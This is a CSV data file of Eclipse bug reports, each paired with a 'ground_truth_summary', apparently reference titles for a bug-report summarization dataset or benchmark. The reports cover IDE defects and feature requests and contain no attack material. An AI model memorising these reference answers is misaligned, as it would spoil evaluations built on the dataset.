bug.id,bug_report,ground_truth_summary
579,"Build ID: I20070525-1350  Steps To Reproduce: 1. create jsp, jspx, jsf and jspf files with tag, that contributes variable to EL. For example: <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <html><body> <f:view> <h:dataTable var=""c""> <h:column> <h:outputText value=""#{c}"" /> </h:column> </h:dataTable> </f:view> </body></html>  2. call content assist for EL expression in created files. In that case h:outputText in each of the created files. Variable will be present in jsp/jspx files, and for jsf/jspf it won't be.   More information: Reproduced in WTP2.0 RC1  As far as i see, it can be fixed be widening list of possible content types, for which EL variable contribution is performed: ""org.eclipse.jst.jsp.core.jspsource"" || ""org.eclipse.jst.jsp.core.jspfragmentsource"" instead of only ""org.eclipse.jst.jsp.core.jspsource"".",JSF html/core tags doesn't contribute variables to EL in file with JSP-fragment content type
626,"At startup the VariableContextManager is created and it starts listening to  the ""world"" so that it can maintain a currently selected resource.  It appears that this is unnecessary...the VariableContextManager could resolve  the selection when it is needed, that is in  VariableContextManager#getVariableContext()",VariableContextManager and ExternalToolsPlugin#startup
733,build R2.1  Every time I type a character all visible squiggly line annotations are  rendered. Since the AnnotationPainter already checks whether an annotation is visible it  seems reasonable to check whether it is affected by a redraw request. Noticed this while researching bug 32571.,[painting] Annotations rendered when not necessary
852,Code:  package bugfinder;  import java.util.Calendar;  public class StaticInit { 	static { 		Calendar.getInstance(); 	} }   Actions: - Position yourself between stance() and ; - Press Ctrl+1 - Select Assign statement to new field ... nothing happens,'Assign statement to new field' quick fix does not work in static initializer
866,You can no longer select <None> connection when the project's connection is already set in the JPA properties page.,Unable to disable DB Connection in the JPA properties page
905,"When using the File... Import... You cannot type into the ""Directory"" entry  filed.  You can only use the browser button to navigate to it.  You should be  alowed to type into it as well.",File... Import... File system does not allow typing into the directory entry field
1087,GCC Builtin specs Detector in Preferences gets always wrench overlay after collecting entries. It is not intended behavior which is to show overlay after options changed. Entries have no bearing on that.,GCC Builtin Compiler Settings always shows wrench overlay
1109,"If I create an about.ini file with an aboutText entry containing information about my feature, any http url such as http://www.eclipse.org is converted to an underlined hyperlink that can be followed.   https urls (such as https://www.paypal.com) on the other hand remain as text and can't be followed.",[About] https not converted to hyperlink in About Eclipse SDK Features
1182,"Created attachment 123228 Sample report for ""Wrong row counting makes unwanted page break when hiding a nested table content""  Build ID: M20080911-1700  Steps To Reproduce: 1. Create two data sets with some connecting fields, outer join is a must. 2. Create the outer table for the parent dataset. 3. In the detail section merge the cells into a big one. 4. Place here the inner table and some fields from the child data set. 5. In the inner table's binding property set the dependence (with parameter) on the outer table 6. Set the padding on the containing cell (outer table) to 0 at Top and Bottom. 7. Run the report with Birt Preview or PDF output.   More information: If the data sets have enough rows and there is enough empty child rows, unwanted page breaks appear in the output. I made some discussion on the problem through newsgroups, where I attached the sample report with data sets based on the sample database. (http://www.eclipse.org/newsportal/article.php?id=31944&group=eclipse.birt#31944). I attach here too this sample report. I think the reason is around the row (space) counting which tells if a page break is needed.  And I have got a wish too. I would like to make aggregation in the outer table based on the inner table. Presently I'm able to do this with scripting but I can show it (them) only in the footer of the outer table. We made reports with other tool the way they got a parameter to show only summaries or details too. We only hid or show the detail rows because the header of the outer group contained the aggregated values.  Thanks for your efforts, Attila",Wrong row counting makes unwanted page break when hiding a nested table content
1227,1. WARNING in /Eclipse RCP Tests/org/eclipse/ui/tests/rcp/WorkbenchWindowConfigurerTest.java  (at line 189) ActionBarAdvisor advisor = new ActionBarAdvisor(configurer) { The local variable advisor is never read  1. WARNING in /src/org/eclipse/ui/internal/ide/application/IDEWorkbenchAdvisor.java  (at line 38) import org.eclipse.jface.dialogs.Dialog; The import org.eclipse.jface.dialogs.Dialog is never used 2. WARNING in /src/org/eclipse/ui/internal/ide/application/IDEWorkbenchAdvisor.java  (at line 46) import org.eclipse.jface.resource.ImageRegistry; The import org.eclipse.jface.resource.ImageRegistry is never used 3. WARNING in /src/org/eclipse/ui/internal/ide/application/IDEWorkbenchAdvisor.java  (at line 47) import org.eclipse.jface.resource.JFaceResources; The import org.eclipse.jface.resource.JFaceResources is never used,Compiler warnings in I20070517-0010
1441,"I got the following NPE running the test suite:  !ENTRY org.eclipse.core.runtime 4 2 Aug 27, 2004 10:10:31.843 !MESSAGE An internal error occurred during: ""Debug"". !STACK 0 java.lang.NullPointerException 	at  org.eclipse.jdt.internal.debug.core.model.JDIDebugTarget.isOutOfSynch (JDIDebugTarget.java:733) 	at org.eclipse.jdt.internal.debug.ui.JDIModelPresentation.getText (JDIModelPresentation.java:234) 	at org.eclipse.debug.internal.ui.LazyModelPresentation.getText (LazyModelPresentation.java:101) 	at org.eclipse.debug.internal.ui.DelegatingModelPresentation.getText (DelegatingModelPresentation.java:158) 	at  org.eclipse.debug.internal.ui.views.DebugViewLabelDecorator$LabelJob.run (DebugViewLabelDecorator.java:326) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:66)  It looks like the UI was trying to render a debug target that was in the  process of terminating/cleaning up. The method JDIDebugTarget.removeAllThreads () does not obtain a lock on the thread list before clearing it, and thus,  anyone else building a thread iterator can get null entries - i.e. the list  can be in the process of being cleared while buiding the thread iterator.  To make the code more readable, I removed the gettor for #getThreadList().  The ""clear"" operation now obtains the lock on the thread list before clearing.",NPE running test suite
1456,"The Run... Dialog comes up far to big on most platforms.  1) setShellSize uses getShell().getDisplay().getBounds(); for maximum sizes.  This is not correct for multiple monitor case.  See Control.getMonitor().  2) In resize, calculations are being made for the size of tabs but there is no knowledge of how much spacing appears between the text and the image etc.  This calculation is quite meaningless.  You should rely on TabFolder.computeSize to give the correct answer.  3) getInitializeSize is returning a very large number which is not based on the contents of the dialog and is too big on many platforms.  I would just stick with the default provided by Window.  4) initializeBounds should call initializeSashForm before calling super.initializeBounds.  Otherwise, SashForm assumes that all children have the same weight and this throws off the value calculated by the super.  Having done this, there is no need to call ensureSelectionAreaWidth or resize (assuming the sash weights are calculated correctly - see point 5).  5) initializeSashForm should use computeSize to determine the optimal weights.  Call computeSize on the two children that are on the left and the right of the SashForm and use these as the weights.  This will give the ideal weighting.  private void initializeSashForm() { 	if (getSashForm() != null) { 		IDialogSettings settings = getDialogSettings(); 		int[] sashWeights; 		int w1, w2; 		w1 = fLaunchConfigurationSelectionArea.computeSize(SWT.DEFAULT, SWT.DEFALT).x; 		w2 = fLaunchConfigurationEditArea.computeSize(SWT.DEFAULT, SWT.DEFAULT).x; 		sashWeights = new int[] {w1, w2}; 		getSashForm().setWeights(sashWeights); 	}",Bad sizing in LaunchConfigurationsDialog
1489,20050525  see attached screenshot,lots of dots rendered in debug view
1569,"in i0625 (essentially 3.3)   I was running along and there was output going to a console.  At some point I noticed my CPU pegged at 100%.  I paused the target and look at the threads.  It appears the the Main thread was doing Thread [main] (Suspended)	 	ConsoleDocumentAdapter.getLineAtOffset(int) line: 202	 	StyledText.getPointAtOffset(int) line: 4711	 	StyledText.setCaretLocation() line: 6654	 	StyledText.scrollVertical(int, boolean) line: 6449	 	StyledText.setTopIndex(int) line: 8005	 	TextConsoleViewer$3.runInUIThread(IProgressMonitor) line: 116	 	UIJob$1.run() line: 94	 	RunnableLock.run() line: 35	 	UISynchronizer(Synchronizer).runAsyncMessages(boolean) line: 123	 	Display.runAsyncMessages(boolean) line: 3659	 	Display.readAndDispatch() line: 3296	 	Workbench.runEventLoop(Window$IExceptionHandler, Display) line: 2389	 	Workbench.runUI() line: 2353	 	Workbench.access$4(Workbench) line: 2219	 	Workbench$4.run() line: 466	 	Realm.runWithDefault(Realm, Runnable) line: 289	 	Workbench.createAndRunWorkbench(Display, WorkbenchAdvisor) line: 461	 	PlatformUI.createAndRunWorkbench(Display, WorkbenchAdvisor) line: 149	 	IDEApplication.start(IApplicationContext) line: 106	 	EclipseAppHandle.run(Object) line: 153	 	EclipseAppLauncher.runApplication(Object) line: 106	 	EclipseAppLauncher.start(Object) line: 76	 	EclipseStarter.run(Object) line: 363	 	EclipseStarter.run(String[], Runnable) line: 176	 	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method]	 	NativeMethodAccessorImpl.invoke(Object, Object[]) line: 64	 	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43	 	Method.invoke(Object, Object...) line: 615	 	Main.invokeFramework(String[], URL[]) line: 504	 	Main.basicRun(String[]) line: 443	 	Main.run(String[]) line: 1169	 	Main.main(String[]) line: 1144	  When I stepped through the top method left and right were 82 and offsets at 82 was greater than offset.  So we got a nice tight loop in the while().  Not sure how this happened but it seems like a problem and some boundary checks are needed.",infinite loop in console
1588,"3.5 M6  Each time the workbench updates the ""show in context"", JDT's adapter looks up source for the current stack frame. Source lookup can be postponed until the actual result of the ""show in"" is required (if the menu were actually shown).","updating ""show in context"" looks  up source agressively"
1598,"I20100629-0800  Plug-in Dependencies view: The ""Focus On..."" view toolbar button is on the left of the tool bar in Callees mode, but on the right in Callers mode.","Plug-in Dependencies view: Jumpy ""Focus On..."" toolbar button"
1610,See bug 330766.  Will provide a patch once the document is updated for 3.7.,Better navigation for sub-sections in 'What's new' document
1642,"4.3.0.I20130605-2000  With the ""Windows 7 Classic"" theme, view titles are not immediately redrawn when the view changes its busy state. I could not reproduce with an E4 theme.  Steps: - enable ""Always run in background"" - select ""Windows 7 Classic"" theme - restart - Open Type Hierarchy (Ctrl+Shift+H) - enter an often-used type, e.g. Serializable or Comparable (in reasonably small workspaces, you can also use Object)  => View title only goes italic when I move the mouse over the view tab folder. It also stays italic until long after the progress view shows that the job is done. Again, moving the mouse over the tab bar corrects the rendering.",Busy (italic) view title not redrawn promptly with Classic theme
1660,"Since Eclipse 3.0, AbstractTextEditor uses caret creating methods. createInsertCaret(), createOverwriteCaret(), createRawInsertModeCaret(). However, these methods do not set the font information for IME to carets. It caused that font and size of the composition string uses the OS default, not same as the StyledText.",[implementation] A bug of  the IME composition string font.
1710,"Created attachment 220067 stack trace  I get numerous reports of the attached NPE in my log; and, seemingly as a result, the context menu for every node on the Git Repositories tree contains only a single item: ""Paste Repository Path or URI"". Very frustrating - it's hard to get anything done at that point.  At least once, this NPE occurred when I changed the focus to the window displaying the Git Repository Exploring perspective.",NPE in AbstractSharedCommandHandler
1804,"There are two places in the detail formatter manager where errors are logged  and displayed to the user when a 'toString()' evaluation fails. Since the error  is displayed to the user, we do not need to log the errors. We currently do not  log ""thread not suspended errors"", but no errors need to be logged.  see #resolveFormatter & EvaluationListener#evaluationComplete  try { 	valueToString(result.getValue()); } catch (DebugException e) { 	if (e.getStatus().getCode() != IJavaThread.ERR_THREAD_NOT_SUSPENDED) { 		// don't log 'thread not suspended' errors 		JDIDebugUIPlugin.log(e); 	} 	fListener.detailComputed(fValue, e.getStatus().getMessage()); }",Unneccessary error logging from detail formatter manager
2153,"Hi,  I am having a problem controlling a package via the default UML2 Editor. The underlying call it makes is org.eclipse.emf.edit.ui.action.ControlAction hence submitting here.  I am using Eclipse 3.2.1, EMF 2.2.2 and UML2 2.0.2.  I have a sample model that I will attached that can be used to reproduce this bug. The model contains 2 packages (a & b). The package ""a"" contains a primitive type ""string"", the package ""b"" contains a class which has an attribute that has a type of ""string"" from package ""a"".  If I control package ""b"" the href appears fine for it's reference to primitive type in package ""a"", i.e. it refers to My.uml#..... If I then close the editor and reopen and decide to control package ""a"" and ensure ""b"" has been loaded, the href in controlled file holding package ""b"" doesn't get updated and later usage of the editor has lost this href value.  Occasionally it seems to work, if I don't close the editor in between the controlling steps.  I have also noticed that the same problem exists when uncontrolling and that if the resource is set for ""TrackingModification"" if on the occasions that it does work, the isModified flag isn't getting set.  Cheers.  Ronan",Controlling a package leaving model in an inconsistent state.
2168,"As part of accessibility testing for IBM, I've found a number of improvements that could be made to our docs. This also fits in nicely with the accessiblity theme for Galileo.",Documentation accessibility improvements
2286,AFAIK we cannot activate a target platform via the new generic editor extension.   Angelo and Mickael allowed to add code minining annotations which allows to trigger action. Maybe we can use this to allow activation of a target definition file via the generic editor?,[code mining] Allow to activate the target platform via the generic editor
2316,Created attachment 222403 toString patch  I'd like to see an implementation for toString() for XMLMemento that returns the XML content.  If acceptable I added an appropriate patch for this.,add toString method to XMLMemento
2342,"Add columns element in the simple-master-page to define the column count in the master page.  The columns has two properties:  1, count, defines the column count in the master page. The value should be a integer. The default value is 1 which means only one column in the master page. 2, gap, defines the spaces between the columns. The default value is 12pt.",Add columns in master page
2346,"Hi,  Currently, subsystem transition does not support the transition of requirements. This is one of enhancements that could be added to the add-on.   Regards",Enhancement of subsystem transition
2476,"I20090525-2000  We should show the hand pointer for single-click tables and trees (Quick Outline, Quick Type Hierarchy, Hyperlink popup, Breadcrumb popup, maybe more).  This would make it immediately clear that these items are effectively links that are already activated on single click. See also http://msdn.microsoft.com/en-us/library/bb545459.aspx#hand .",[navigate] Show hand pointer for single-click tables and trees
2540,"Build ID: 20090619-0625  Steps To Reproduce: Currently, the definition of the Navigator Content Extension via plugin.xml allows to specify the boolean attribute allowByDefault which controls if the contributed content is active by default. It makes sence to change the type of the attribute from boolean to core expression, which will allow to evaluate the default context and show content depending on it. This will ease the control of content and enhance the declarative configuration of CNF and NCEs.  More information:",[CommonNavigator] Add core expression to determine initial activation for NCE
2579,I'd like to have the possibility to make all suspended threads to continue with only few key clicks. I suggest adding new command to the Run-menu; Ctrl-F8  Resume All Threads. It's implementation should be mostly trivial.,Add new command to Run-menu; Resume All Threads
2583,"1. Debug a program to a breakpoint. 2. When the source appears, decide that it's not the right source.  Currently, there's no way to change the source lookup for a running launch. You can add source  for things that don't have it, but you can't change it if you decide that the source is wrong.  We should be able to allow this by listening to launch configuration changes and updating the  source lookup if the user changes it.",Add ability to change source lookup of a running launch
2724,"By default, JMerger uses the qualified name of the Java elements to match the nodes of the source and target tree.  It would be good if a rule in the marge rule files would allow a more generic approach (such as using a UUID in the javadoc).",JMerger: Enable user defined method to match the Java elements being merged
2805,"I am extending Dali with some additional tooling and am using the Dali models to get information about entities.  However, these classes are all marked as internal.  For instance: org.eclipse.jpa.core.internal.content.java.JavaPersistentType org.eclipse.jpa.core.internal.content.java.JpaCompilationUnit org.eclipse.jpa.core.internal.content.java.JavaPersistentAttribute org.eclipse.jpa.core.internal.IMappingKeys org.eclipse.jpa.core.internal.contnet.java.mappings.JavaId org.eclipse.jpa.core.internal.contnet.java.mappings.JavaBasic  Could these be made open?  I think that these models are a nice way for extenders to interface with entities, rather than having every extender write custom code to do this.   Here are two examples of how I am using the models:  // get the primary key field and return type for an entity public static ParameterContainer getPrimaryKeyParameter(JavaPersistentType entity) { 	List<JavaPersistentAttribute> atttributes = entity.getAttributes(); 	for (JavaPersistentAttribute jpAtt : atttributes) { 		String attributeType = jpAtt.getMappingKey(); 		if (attributeType.equals(IMappingKeys.ID_ATTRIBUTE_MAPPING_KEY))  			String attributeName = jpAtt.getAttribute().getName(); 			String attributeTypeName = jpAtt.getAttribute().resolvedTypeName(); 			return new ParameterContainer(attributeName, attributeTypeName); 		} 	} 	return null; }  // get the temporal type for an attribute public static MyTemporalType getTemporalTypeForAttribute(JavaPersistentType entity, String attributeName) { 	List<JavaPersistentAttribute> atttributes = entity.getAttributes(); 	for (JavaPersistentAttribute jpAtt : atttributes) { 		String attName = jpAtt.getAttribute().getName(); 		if (attName.equals(attributeName)) { 			String attributeType = jpAtt.getMappingKey(); 			if (attributeType.equals(IMappingKeys.ID_ATTRIBUTE_MAPPING_KEY)) { 				IJavaAttributeMapping mapping = jpAtt.getMapping(); 				TemporalType temporalType = ((JavaBasic) mapping).getTemporal(); 				if (mapping instanceof JavaId) { 					int temporalTypeValue = temporalType.getValue(); 					if (temporalTypeValue == TemporalType.NULL) { 						return MyTemporalType.NONE; 					} 					else if (temporalTypeValue == TemporalType.DATE) { 						return MyTemporalType.DATE; 					} 					if (temporalTypeValue == TemporalType.TIME) { 						return MyTemporalType.TIME; 					} 					if (temporalTypeValue == TemporalType.TIMESTAMP) { 						return MyTemporalType.TIMESTAMP; 					} 				} 			} 			else if (attributeType.equals(IMappingKeys.BASIC_ATTRIBUTE_MAPPING_KEY)) { 				IJavaAttributeMapping mapping = jpAtt.getMapping(); 				if (mapping instanceof JavaBasic) { 					TemporalType temporalType = ((JavaBasic) mapping).getTemporal(); 					int temporalTypeValue = temporalType.getValue(); 					if (temporalTypeValue == TemporalType.NULL) { 						return MyTemporalType.NONE; 					} 					else if (temporalTypeValue == TemporalType.DATE) { 						return MyTemporalType.DATE; 					} 					if (temporalTypeValue == TemporalType.TIME) { 						return MyTemporalType.TIME; 					} 					if (temporalTypeValue == TemporalType.TIMESTAMP) { 						return MyTemporalType.TIMESTAMP; 					} 				} 			} 		} 	} 	return MyTemporalType.NONE; }",Internal models should be made public (provisional)
2813,Bug 521487 added explicit native method to cache JavaVM pointer. A better option is to cache it in JNI_OnLoad.,[GTK] Automatically cache JVM pointer for callbacks
2864,"Follow-up to bug 283856 / bug 315416, which made help links like this work (note the missing release name in front of /topic):  http://help.eclipse.org/topic/org.eclipse.platform.doc.user/tasks/running_eclipse.htm  However, it's still a bit painful to create such a link, since the location you see as a user when browsing help looks like this:  http://help.eclipse.org/juno/index.jsp?topic=%2Forg.eclipse.platform.doc.user%2Ftasks%2Frunning_eclipse.htm  Could you add a rewrite rule that also makes this form work and inserts ""/juno"" in front of ""/index.jsp""?  http://help.eclipse.org/index.jsp?topic=%2Forg.eclipse.platform.doc.user%2Ftasks%2Frunning_eclipse.htm   Note: Currently, http://help.eclipse.org/index.jsp mangles the host name into  http://help.ehelp.eclipse.org/index.jsp",Redirect http://help.eclipse.org/index.jsp to http://help.eclipse.org/juno/
3050,"If long Task/Error messages are dispayed in the task view, it can be very  tedious to scroll through the view / shift table columns. A multiline view  component for the description, or an additional detail view (dialog window)  showing the content of a selected task line would help very much. The detail  view could be opened by double click or context menu.",[Tasks] Detail view for Task/Error list
3096,"The Lock.uiSafeAcquire() method that transactions use to acquire the editing domain lock ensure UI thread liveness by only performing timed waits to attempt to acquire the lock before invoking the heavy-weight Job-based mechanism for witing for the lock while allowing the platform UI's UISynchronizer to continue processing UI events.  Unfortunately, the UI thread is frequently interrupted by the UI platform when Display.syncExec() calls are made by any Eclipse plug-in.  These result in the timed waits being interrupted, which throws an InterruptedException that clients are forced to deal with.  The Lock should ignore interrupts during the timed wait phase of the uiSafeAcquire() method.  When uiSafeAcquire() branches to the regular acquire() method, then the latter should honour interrupt requests.  Likewise, the Job-blocking algorithm in the uiSafeAcquire().",UI Thread Interrupts interfere with Timed Transaction Waits
3282,Created attachment 179297 Project to reproduce the problem  Steps to reproduce: 1) Install the Android Eclipse Tooling from http://developer.android.com/sdk/index.html (I am using Android API version 8) 2) import the attached Project 3) open com.example.android.skeletonapp.SkeletonActivity and go to line 57 4) insert . --> wait ~4 sec  5) start typing set '-->' wait between 10 and 30 sec.  The next time it seems to be faster but it still takes up to 5 sec.  I think this issue is major or even critical as it makes Eclipse hardly usable in such scenarios.,Very slow code completion for larger completion lists
3316,"To reproduce:  1. Create a team job. 2. cd HUDSON_HOME/teams/TeamName/jobs/JobName 3. mkdir undeletable 4. chmod -x undeletable 5. cd ~ # or anywhere outside job folder 6. In Hudson, delete the job. The delete will throw an exception and say the job can't be deleted. The job still appears in view. 7. Restart Hudson. The job no longer appears in view, but it is still in teams.xml file and will still show up (as bad link) in team admin Jobs tab. The job folder exists with no config.xml.","If job folder can't be deleted, Delete Job removes config.xml but leaves job folder and job entry in teams.xml"
3398,"I20100224-2242  I don't have steps to reproduce, but with this build, I often see the suspended thread disappearing from the Debug view. Most of the time, the thread disappears about 20 seconds after I last interacted with debug (stepped, selected something in the Debug or Variables view). It happens while I am doing nothing and also while I'm navigating around in different editors.  I can recover the lost thread by toggling 'Java > Show System Threads' in the Debug view menu.",Suspended thread disappears from Debug view
3425,"From the test summary page,  http://download.eclipse.org/eclipse/downloads/drops4/I20140525-2000/testResults.php It appears many tests show up in the first column, no matter what platform they are in ... and many show up as ""did not run"" ... but from looking at ""build results"" directories directly on build machine ... seems everything is there.   My theory is I ""broke"" how the indexer works by removing some properties that I though were not being used, as part of bug 435671. (And if that's the case ... appears the properties were being used for multiple purposes, at one point ... but might impact how ""the test indexer"" operates.   The commit in question is  http://git.eclipse.org/c/platform/eclipse.platform.releng.aggregator.git/commit/?id=892857c79f11b6be9ec5dcbb27b912d35e0043f2  Just do defend myself :) I assume the actual ""platform.template.php"" was no longer used, since we removed the ""filters"" from the DL and test pages. The reason this came to my attention is it not only contained references to the ""checksum"" directory (that's its relation to bug 435671) and then I noticed is referred to the ""drop"" location as "".../drops/..."" instead of what we currently use "".../drops4/..."".   But, like I said ... could have been playing multiple roles (sigh).   I'll try ""reverting"" that one commit, and re-running ""test indexer"".","test summaries from 0525-2000 are ""mixed up"" (or missing)"
3426,"During promotion from build machine to downloads server, we change the names of files (such as, so they have ""4.6RC2"" in the name, instead of ""I20160519-1730"").   And, to complicate matters, we ""promote"" from my own ID (not e4Build) since e4Build does not have write access to ""downloads"". But the ""signatures"" are under ""e4Build"".   So much for automation! For RC2 I did a lot ""by hand"" switching ids as needed. Not fun.",Checksum files need to be resigned during promotion
3451,"The Ant editor does not release JARs that supply tasks used in the build script.  I have a custom ant task that I want to use in my build script. I compile it as  part of the script, package it into a jar, and then do a <taskdef> later on to  define the task and use it.  Once I use the Ant editor on the build script, I can not delete the JAR file as  the Eclipse Ant support still has it open. In order for Eclipse to release the  JAR, I need to restart Eclipse.  Please note that the JAR file isn't being used in Eclipse in any other way (ie  not part of the project build, or part of the External Task runner)  (This is similar to the bug #61689, but relates to the Ant Editor, not the Ant  runtime)",Ant editor locks jars supplying tasks
3697,"In the class org.eclipse.jdt.internal.corext.dom.ASTFlattener, the code in the method ""public boolean visit(EnumDeclaration node)"" seems to expect EnumConstantDeclarations, in the ""bodyDeclarations"" list, but enumeration constants are stored in ""enumConstants"" list.  NaiveASTFlattener works OK, though.",ASTFlattener does not serialize EnumConstantDeclarations [code manipulation]
3711,"using wtp2.0.1 20070830060235  create new xml editing and validating xml files examples project the project shows up twice in the project explorer  this doesnt happen in the navigator view this doesnt happen when i create a new web, java, simple project this doesnt happen when i create new gef example projects",[CommonNavigator] 2 xml example projects show up in project explorer
3745,"Neil:  I didn't notice this until now, but the new EMFT site doesn't link up the 1.0.0/0.7.0 NLpacks for the 5 projects released in June.  Paths to files on the servers are as follows:  download: /home/data/httpd/download.eclipse.org/technology/emft/downloads/NLS emf.toro: /var/www/technology/emft/downloads/NLS emft.eclipse: (not yet applicable)  There are two zips for each project, and only appear for OCL, Query, Transaction, Validation, and JET.  We should add a similar right-side box for NL packs as on EMF, but only have it appear for the 5 projects above. Also, while you're redoing the footer, we should probably rewrite the copy about ""using EMFT"" since by itself there's no such thing.",EMFT NLpacks are not available in new Phoenix skin
3799,"In the following code  int a = 100; c = a instanceof Object;  eclipse does not mark any error or something and produces a class file. The code is not runnable and produces a VerifierError because ""a"" is not an Object.  I used Build id: I20060413-1718 for this test",[1.5][compiler] instanceof accepts primitive type as left-hand-side
3858,"Take the following code:  	package nulla; 	 	import org.eclipse.jdt.annotation.NonNullByDefault; 	 	@NonNullByDefault 	public class NullaTest { 		 		 		Object foo() { 			return new Object(); 		} 		 		void bar() { 			o = foo(); 		} 		 	}  Invoke the quickfix 'create local variable o'. The resulting code will be:  			@NonNull 			Object o = foo();   The @NonNull annotation is not necessary, especially not for local variables.","[1.8][null] Quickfixes add unnecessary @NonNull annotation to types, when @NonNullByDefault is used"
